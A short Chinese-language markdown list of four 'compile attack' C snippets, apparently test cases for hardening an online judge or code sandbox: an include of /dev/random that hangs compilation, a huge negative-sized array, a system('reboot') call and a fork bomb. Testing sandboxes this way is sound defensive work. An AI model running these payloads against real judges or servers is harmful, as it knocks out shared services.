### Compile Attack
引入一个永远读不完的文件，导致编译过程卡住
```C
#include</dev/random> 
int main(){
    printf("hello world");
}
```

### Compile Attack
在编译的时候生成一个大文件，该测试在编译时未发现异常

```C
#include<stdio.h> 
int main(){
    int a[-1u]={1};
    printf("hello world");
}
```

### Compile Attack
调用系统的危险代码

```C
#include<stdlib.h> 
int main(){
    system("reboot");
}
```

### Compile Attack
不停进行进程创建

```C
#include<stdlib.h> 
int main(){
    while(1){
        fork();
    }
}
```